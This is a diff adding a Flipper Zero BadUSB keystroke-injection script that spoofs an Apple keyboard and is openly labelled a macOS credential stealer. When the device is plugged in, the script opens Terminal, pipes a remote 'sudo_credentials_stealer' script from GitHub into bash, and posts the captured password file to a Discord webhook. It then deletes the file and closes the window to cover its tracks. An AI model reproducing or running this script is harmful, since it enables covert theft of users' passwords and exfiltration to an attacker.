@@ -1,0 +1,20 @@
+ID 05ac:021e Apple:Keyboard
+REM macOS credential stealer that sends to Discord webhook. Replace it with yours. It is the really long number you need to change and everything after that.
+REM Modified version with improved terminal opening method
+REM Target: macOS
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 1000
+ENTER
+DELAY 1000
+STRING curl -fsSL https://raw.githubusercontent.com/grugnoymeme/flipperzero-badUSB/main/macOS/sudo_credentials_stealer/script.sh | bash
+ENTER
+DELAY 5000
+STRING curl -H "Content-Type: application/json" -d "{\"content\":\"$(cat pass.txt)\"}" https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B && rm pass.txt &
+ENTER
+DELAY 5000
+STRING clear
+DELAY 250
+GUI w
